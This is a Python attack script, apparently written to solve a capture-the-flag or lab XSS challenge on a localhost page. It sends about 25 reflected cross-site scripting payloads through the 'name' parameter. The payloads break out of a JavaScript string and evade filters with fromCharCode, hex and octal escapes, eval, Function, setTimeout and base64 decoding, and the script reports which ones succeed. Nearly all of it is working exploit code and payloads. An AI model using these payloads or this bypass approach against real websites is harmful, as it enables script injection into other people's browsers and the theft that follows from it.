import requests
import urllib.parse
import re

target_url = "http://127.0.0.1:32830/page"

def url_encode(s):
    return urllib.parse.quote(s, safe='')

def test_breakout_variants():
    """Test different ways to break out of the JS string context"""
    
    print("="*80)
    print("TESTING BREAKOUT PATTERN VARIANTS")
    print("="*80)
    print()
    
    # Test different breakout patterns
    test_cases = []
    
    # Test 1: Simple quote breakout - let the quote close the string
    # Original: var name = ""; alert(...); //";
    test1 = '";alert(String.fromCharCode(88,83,83));//'
    test_cases.append(("Classic breakout", test1))
    
    # Test 2: No space after semicolon
    test2 = '";alert(String.fromCharCode(88,83,83));//'
    test_cases.append(("No spaces", test2))
    
    # Test 3: Using -- instead of // for comment
    test3 = '";alert(String.fromCharCode(88,83,83));--'
    test_cases.append(("SQL-style comment", test3))
    
    # Test 4: Newline in comment
    test4 = '";alert(String.fromCharCode(88,83,83));//\n'
    test_cases.append(("Newline in comment", test4))
    
    # Test 5: Multiple statements
    test5 = '";var a=String.fromCharCode(88,83,83);alert(a);//'
    test_cases.append(("Two statements", test5))
    
    # Test 6: Using eval with string
    test6 = '";eval("alert(String.fromCharCode(88,83,83))");//'
    test_cases.append(("eval wrapper", test6))
    
    # Test 7: Using Function
    test7 = '";Function("alert(String.fromCharCode(88,83,83))")();//'
    test_cases.append(("Function constructor", test7))
    
    # Test 8: Template literal breakout
    test8 = '";`${alert(String.fromCharCode(88,83,83))}`;//'
    test_cases.append(("Template literal", test8))
    
    # Test 9: Comma operator
    test9 = '";alert(String.fromCharCode(88,83,83)),"ignored";//'
    test_cases.append(("Comma operator", test9))
    
    # Test 10: AND operator (if first part truthy)
    test10 = '";true&&alert(String.fromCharCode(88,83,83));//'
    test_cases.append(("AND operator", test10))
    
    # Test 11: OR operator (if first part falsy)
    test11 = '";false||alert(String.fromCharCode(88,83,83));//'
    test_cases.append(("OR operator", test11))
    
    # Test 12: Conditional
    test12 = '";true?alert(String.fromCharCode(88,83,83)):0;//'
    test_cases.append(("Ternary conditional", test12))
    
    # Test 13: IIFE pattern
    test13 = '";(function(){alert(String.fromCharCode(88,83,83))})();//'
    test_cases.append(("IIFE pattern", test13))
    
    # Test 14: setTimeout
    test14 = '";setTimeout("alert(String.fromCharCode(88,83,83))",1);//'
    test_cases.append(("setTimeout", test14))
    
    # Test 15: setInterval (will execute once and clear)
    test15 = '";var i=setInterval("alert(String.fromCharCode(88,83,83))",1);clearInterval(i);//'
    test_cases.append(("setInterval+clear", test15))
    
    potential_cases = []
    
    for i, (desc, payload) in enumerate(test_cases, 1):
        print(f"\n[TEST {i:02d}] {desc}")
        print(f"Raw: {payload}")
        
        encoded = url_encode(payload)
        print(f"Encoded: {encoded}")
        
        try:
            url = f"{target_url}?name={encoded}"
            response = requests.get(url, timeout=10)
            text = response.text
            status = response.status_code
            
            print(f"Status: {status}, Length: {len(text)}")
            
            # Check reflection
            match = re.search(r'var name = "([^"]*)"', text)
            if match:
                reflected = match.group(1)
                print(f"Reflected: var name = \"{reflected}\"")
                
                # Check if breakout worked (looking for the actual payload executed)
                if "XSS" in text and len(text) > 900:
                    print(f"[!] POTENTIAL SUCCESS: 'XSS' appears and response is longer!")
                    potential_cases.append((desc, payload, encoded, text))
                elif "XSS" in text:
                    print(f"[+] 'XSS' string found in output")
                    potential_cases.append((desc, payload, encoded, text))
                elif len(text) > 900:
                    print(f"[+] Response length anomaly (> 900 bytes)")
                else:
                    print(f"[-] No XSS found, normal response length")
                    
            else:
                print(f"[ERROR] Could not find var name reflection!")
                
        except Exception as e:
            print(f"[-] Error: {str(e)}")
        
        print("-"*70)
    
    return potential_cases

def test_alternative_constructions():
    """Test alternative ways to construct 'XSS' without uppercase S"""
    
    print("\n" + "="*80)
    print("ALTERNATIVE 'XSS' CONSTRUCTION METHODS")
    print("="*80)
    
    alternatives = []
    
    # Alternative 1: Using String literal with escaped characters
    alt1 = '";alert("X"+String.fromCharCode(83,83));//'
    alternatives.append(("X + fromCharCode(83,83)", alt1))
    
    # Alternative 2: Using hex for all characters
    alt2 = '";alert(String.fromCharCode(0x58,0x53,0x53));//'
    alternatives.append(("Hex values 0x58,0x53,0x53", alt2))
    
    # Alternative 3: Using octal notation
    alt3 = '";alert("\\130\\123\\123");//'
    alternatives.append(("Octal \\130\\123\\123", alt3))
    
    # Alternative 4: Using parseInt with radix
    alt4 = '";alert(String.fromCharCode(parseInt("58",10),83,83));//'
    alternatives.append(("parseInt + fromCharCode", alt4))
    
    # Alternative 5: Using Array.map
    alt5 = '";alert([88,83,83].map(String.fromCharCode).join(""));//'
    alternatives.append(("Array.map + join", alt5))
    
    # Alternative 6: Using spread operator
    alt6 = '";alert(String.fromCharCode(...[88,83,83]));//'
    alternatives.append(("Spread operator", alt6))
    
    # Alternative 7: Using reduce
    alt7 = '";alert([88,83,83].reduce((a,b)=>a+String.fromCharCode(b),""));//'
    alternatives.append(("Array.reduce", alt7))
    
    # Alternative 8: Using Buffer (if available)
    alt8 = '";alert(Buffer.from("WFNT","base64").toString());//'
    alternatives.append(("Buffer.from base64", alt8))
    
    # Alternative 9: Using btoa (reverse)
    alt9 = '";alert(function(s){var d=atob(s);return d;}("WFNT"));//'
    alternatives.append(("IIFE with atob", alt9))
    
    # Alternative 10: Multiple concatenations
    alt10 = '";var a=String.fromCharCode(88);var b=String.fromCharCode(83);alert(a+b+b);//'
    alternatives.append(("Multi-var concatenation", alt10))
    
    for i, (desc, payload) in enumerate(alternatives, 1):
        print(f"\n[ALT {i:02d}] {desc}")
        print(f"Raw: {payload}")
        
        encoded = url_encode(payload)
        print(f"URL: {target_url}?name={encoded}")
        
        try:
            url = f"{target_url}?name={encoded}"
            response = requests.get(url, timeout=10)
            text = response.text
            
            if "XSS" in text:
                print(f"[!] SUCCESS: XSS executed!")
                
                # Parse reflection
                match = re.search(r'var name = "([^"]*)"', text)
                if match:
                    reflected = match.group(1)
                    print(f"Reflection: {reflected}")
                
                # Show snippet around XSS
                idx = text.find("XSS")
                snippet = text[max(0, idx-100):idx+100]
                print(f"Snippet: ...{snippet}...")
                
                return [(desc, payload, encoded, text)]
            else:
                print(f"[-] No XSS in response")
                
        except Exception as e:
            print(f"[-] Error: {str(e)}")
    
    return []

# Run tests
results = test_breakout_variants()
results += test_alternative_constructions()

if results:
    print(f"\n[🎯] FOUND {len(results)} POTENTIAL BYPASSES!")
    for desc, payload, encoded, text in results:
        print(f"\nDescription: {desc}")
        print(f"Payload: {payload}")
        print(f"URL: {target_url}?name={encoded}")
else:
    print("\n[?] No successful bypasses yet. Consider double-encoding.")
